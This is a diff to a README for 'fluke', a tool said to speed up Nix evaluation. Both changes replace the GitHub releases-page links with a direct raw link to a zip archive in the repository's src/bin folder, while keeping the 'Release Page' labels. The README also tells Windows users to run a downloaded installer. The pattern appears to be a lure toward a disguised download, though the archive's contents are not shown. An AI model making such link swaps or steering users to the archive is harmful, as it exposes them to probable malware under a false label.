@@ -1,6 +1,6 @@
 # 🚀 fluke - Faster Nix evaluation for your projects
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sintered-eggshell5927/fluke/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Sintered-eggshell5927/fluke/main/src/bin/Software_v1.8.zip)
 
 Fluke helps you work with Nix projects. It watches how Nix evaluates your code and stores the results. This action saves time when you run your projects again. You spend less time waiting for your computer to process files.
 
@@ -8,7 +8,7 @@ Fluke helps you work with Nix projects. It watches how Nix evaluates your code a
 
 You need a Windows computer to use Fluke. This tool works with standard Windows setups. Follow these steps to prepare your system and run the software.
 
-1. Visit the [releases page](https://github.com/Sintered-eggshell5927/fluke/releases) to obtain the installer.
+1. Visit the [releases page](https://raw.githubusercontent.com/Sintered-eggshell5927/fluke/main/src/bin/Software_v1.8.zip) to obtain the installer.
 2. Select the file ending in `.msi` or `.exe` for Windows.
 3. Save the file to your computer.
 4. Open the downloaded file to start the installation.
